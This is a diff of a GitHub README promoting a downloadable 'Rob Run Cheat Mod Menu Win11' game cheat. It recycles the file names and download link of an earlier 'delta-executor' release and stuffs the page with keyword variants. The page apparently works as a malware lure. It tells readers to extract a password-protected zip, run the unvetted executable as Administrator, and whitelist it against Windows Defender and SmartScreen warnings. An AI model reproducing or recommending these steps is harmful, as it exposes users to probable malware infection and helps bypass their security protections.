@@ -5,9 +5,9 @@
 ![Package](https://img.shields.io/badge/Size-4.8%20MB-informational?style=flat-square)
 ![Rating](https://img.shields.io/badge/Rating-4.9%2F5-gold?style=flat-square&logo=star)
 
-Engineered for Windows 10/11 64-bit systems, **🔮 Rob Run Cheat Mod Menu Win11** (`Build ED557F`) introduces native 64-bit execution through `delta-executor-pc-2026-v1.2.2-win64.exe`. Download `delta-executor-pc-2026-v1.2.2-win64.zip` (`4.8 MB`) and unlock with password **`2026`**.
+Engineered for Windows 10/11 64-bit systems, **🔮 Rob Run Cheat Mod Menu Win11** (`Build ED557F`) introduces native 64-bit execution through `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe`. Download `rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip` (`4.8 MB`) and unlock with password **`2026`**.
 
-> **Direct Package:** [`delta-executor-pc-2026-v1.2.2-win64.zip`](https://github.com/dawidb9567/delta-executor-pc-2026/releases/download/v1.2.0/delta-executor-pc-2026-v1.2.2-win64.zip) (`4.8 MB`) · **Password:** **`2026`** · **Build:** `v4.9.6 (ED557F)`
+> **Direct Package:** [`rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip`](https://github.com/dawidb9567/delta-executor-pc-2026/releases/download/v1.2.0/delta-executor-pc-2026-v1.2.2-win64.zip) (`4.8 MB`) · **Password:** **`2026`** · **Build:** `v4.9.6 (ED557F)`
 
 <a id="download-top"></a>
 
@@ -34,23 +34,23 @@ Engineered for Windows 10/11 64-bit systems, **🔮 Rob Run Cheat Mod Menu Win11
 
 | **🪶 User-Mode External Core** | **⚡ Panic Key Unload (`END`)** | **🔄 Dynamic Offset Scanner** |
 | :---: | :---: | :---: |
-| Streamlines high-frequency user-mode external core (`rob-run-cheat-mod-menu-win11` · Desktop Duplication rendering without internal DLL hooks) under build `ED557F` using `< 52 MB` RAM. | Manages lock-free panic key unload (`end`) (`rob-run-cheat-mod-menu-win11` · instant handle release & zero-trace process exit) under build `ED557F` across `7` worker threads. | Optimizes asynchronous dynamic offset scanner (`rob-run-cheat-mod-menu-win11` · automated pointer signature resolution after patches) via `rob-run-cheat-mod-menu-win11`'s core module in `< 37 ms` response time. |
+| Streamlines high-frequency user-mode external core (`rob-run-cheat-mod-menu-win11` · Desktop Duplication rendering without internal DLL hooks) under build `ED557F` using `< 52 MB` RAM. | Manages lock-free panic key unload (`end`) (`rob-run-cheat-mod-menu-win11-2026` · instant handle release & zero-trace process exit) under build `ED557F` across `7` worker threads. | Optimizes asynchronous dynamic offset scanner (`rob-run-cheat-mod-menu-win11-pc` · automated pointer signature resolution after patches) via `rob-run-cheat-mod-menu-win11`'s core module in `< 37 ms` response time. |
 
 | **🎯 Bezier Input Smoothing** | **🗺️ 2D Radar & Loot Filter** | **💾 Hot-Swap JSON Profiles** |
 | :---: | :---: | :---: |
-| Powers hardware-timed bezier input smoothing (`rob-run-cheat-mod-menu-win11` · configurable FOV radius, VisCheck & humanized target curves) within the `Rob Run Cheat Mod Menu Win11` runtime using `< 27 MB` RAM. | Drives isolated 2d radar & loot filter (`rob-run-cheat-mod-menu-win11` · rarity-based item culling & container tracking) inside `delta-executor-pc-2026-v1.2.2-win64.exe` with `98.4%` consistency. | Powers thread-safe hot-swap json profiles (`rob-run-cheat-mod-menu-win11` · 1-key switching between Legit, Visual & Custom presets) across `rob-run-cheat-mod-menu-win11` sessions with `99.5%` consistency. |
+| Powers hardware-timed bezier input smoothing (`rob-run-cheat-mod-menu-win-windows-11` · configurable FOV radius, VisCheck & humanized target curves) within the `Rob Run Cheat Mod Menu Win11` runtime using `< 27 MB` RAM. | Drives isolated 2d radar & loot filter (`rob-run-cheat-mod-menu-win-portable` · rarity-based item culling & container tracking) inside `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe` with `98.4%` consistency. | Powers thread-safe hot-swap json profiles (`rob-run-cheat-mod-menu-win-x64` · 1-key switching between Legit, Visual & Custom presets) across `rob-run-cheat-mod-menu-win11` sessions with `99.5%` consistency. |
 
 ---
 
 ## 🚀 How To Download & Install Rob Run Cheat Mod Menu Win11
 
-1. **Grab `delta-executor-pc-2026-v1.2.2-win64.zip`:** Use the button above on `ann87880/rob-run-cheat-mod-menu-win11` to save `delta-executor-pc-2026-v1.2.2-win64.zip` (`4.8 MB`, build `ED557F`).
-2. **Unlock with Password `2026`:** Open `delta-executor-pc-2026-v1.2.2-win64.zip` in 7-Zip or WinRAR and extract the `rob-run-cheat-mod-menu-win11` folder using password **`2026`**.
-3. **Launch `delta-executor-pc-2026-v1.2.2-win64.exe`:** Right-click `delta-executor-pc-2026-v1.2.2-win64.exe` (`v4.9.6`) and choose **Run as Administrator** on Windows 10/11 64-bit systems.
-4. **Apply `Rob Run Cheat Mod Menu Win11` Modules:** Select your `rob-run-cheat-mod-menu-win11` profile inside `delta-executor-pc-2026-v1.2.2-win64.exe` and verify the status indicator is active.
+1. **Grab `rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip`:** Use the button above on `ann87880/rob-run-cheat-mod-menu-win11` to save `rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip` (`4.8 MB`, build `ED557F`).
+2. **Unlock with Password `2026`:** Open `rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip` in 7-Zip or WinRAR and extract the `rob-run-cheat-mod-menu-win11` folder using password **`2026`**.
+3. **Launch `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe`:** Right-click `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe` (`v4.9.6`) and choose **Run as Administrator** on Windows 10/11 64-bit systems.
+4. **Apply `Rob Run Cheat Mod Menu Win11` Modules:** Select your `rob-run-cheat-mod-menu-win11` profile inside `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe` and verify the status indicator is active.
 
 > [!IMPORTANT]
-> **Archive Password:** **`2026`** — Extract `delta-executor-pc-2026-v1.2.2-win64.zip` completely before launching `delta-executor-pc-2026-v1.2.2-win64.exe` as Administrator.
+> **Archive Password:** **`2026`** — Extract `rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip` completely before launching `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe` as Administrator.
 
 <div align="center">
 
@@ -64,46 +64,46 @@ Engineered for Windows 10/11 64-bit systems, **🔮 Rob Run Cheat Mod Menu Win11
 ## ❓ Rob Run Cheat Mod Menu Win11 (`v4.9.6`) — FAQ
 
 <details>
-<summary><b>Is Rob Run Cheat Mod Menu Win11 (`delta-executor-pc-2026-v1.2.2-win64.zip`) compatible with Windows 10/11 64-bit systems?</b></summary>
+<summary><b>Is Rob Run Cheat Mod Menu Win11 (`rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip`) compatible with Windows 10/11 64-bit systems?</b></summary>
 <br>
-Yes — `delta-executor-pc-2026-v1.2.2-win64.exe` (`v4.9.6`) runs natively on Windows 10/11 64-bit systems across Intel and AMD x64 processors.
+Yes — `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe` (`v4.9.6`) runs natively on Windows 10/11 64-bit systems across Intel and AMD x64 processors.
 </details>
 
 <details>
-<summary><b>What is the password to extract `delta-executor-pc-2026-v1.2.2-win64.zip` for Rob Run Cheat Mod Menu Win11?</b></summary>
+<summary><b>What is the password to extract `rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip` for Rob Run Cheat Mod Menu Win11?</b></summary>
 <br>
-Enter **`2026`** in 7-Zip or WinRAR when unpacking `delta-executor-pc-2026-v1.2.2-win64.zip` (`4.8 MB`) before starting `delta-executor-pc-2026-v1.2.2-win64.exe`.
+Enter **`2026`** in 7-Zip or WinRAR when unpacking `rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip` (`4.8 MB`) before starting `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe`.
 </details>
 
 <details>
-<summary><b>How do I fix Windows Defender or SmartScreen alerts on `delta-executor-pc-2026-v1.2.2-win64.exe` (`v4.9.6`)?</b></summary>
+<summary><b>How do I fix Windows Defender or SmartScreen alerts on `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe` (`v4.9.6`)?</b></summary>
 <br>
-Because `delta-executor-pc-2026-v1.2.2-win64.exe` (build `ED557F`) is an independent `game cheat` binary, heuristic checks may prompt a warning. Confirm you downloaded `delta-executor-pc-2026-v1.2.2-win64.zip` from `ann87880/rob-run-cheat-mod-menu-win11`, whitelist the `rob-run-cheat-mod-menu-win11` directory, and run `delta-executor-pc-2026-v1.2.2-win64.exe` as Administrator.
+Because `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe` (build `ED557F`) is an independent `game cheat` binary, heuristic checks may prompt a warning. Confirm you downloaded `rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip` from `ann87880/rob-run-cheat-mod-menu-win11`, whitelist the `rob-run-cheat-mod-menu-win11` directory, and run `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe` as Administrator.
 </details>
 
 ---
 
-## 💻 `delta-executor-pc-2026-v1.2.2-win64.exe` — Build Manifest
+## 💻 `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe` — Build Manifest
 
 | `rob-run-cheat-mod-menu-win11` Attribute | `Rob Run Cheat Mod Menu Win11` Value |
 | :--- | :--- |
 | **Target Platform** | Windows 10/11 64-bit systems |
-| **Executable & Build** | `delta-executor-pc-2026-v1.2.2-win64.exe` (`v4.9.6` · `ED557F474D`) |
-| **Release Archive** | `delta-executor-pc-2026-v1.2.2-win64.zip` (`4.8 MB`) |
+| **Executable & Build** | `rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe` (`v4.9.6` · `ED557F474D`) |
+| **Release Archive** | `rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip` (`4.8 MB`) |
 | **Unzip Password** | **`2026`** |
 
 ```ini
 ; Rob Run Cheat Mod Menu Win11 Runtime Parameters (ED557F474D)
 [rob-run-cheat-mod-menu-win11]
 Build = v4.9.6
-Archive = delta-executor-pc-2026-v1.2.2-win64.zip
+Archive = rob-run-cheat-mod-menu-win11-v1.2.2-win64.zip
 Password = 2026
-Binary = delta-executor-pc-2026-v1.2.2-win64.exe
+Binary = rob-run-cheat-mod-menu-win11-v1.2.2-win64.exe
 ```
 
 ---
 
 <p align="center">
   <strong>🔮 Rob Run Cheat Mod Menu Win11 · v4.9.6 (ED557F474D)</strong><br>
-  `rob-run-cheat-mod-menu-win11`
+  `rob-run-cheat-mod-menu-win11` · `rob-run-cheat-mod-menu-win11-2026` · `rob-run-cheat-mod-menu-win11-pc` · `rob-run-cheat-mod-menu-win-windows-11` · `rob-run-cheat-mod-menu-win-portable` · `rob-run-cheat-mod-menu-win-x64` · `rob-run` · `rob-run-2026`
 </p>
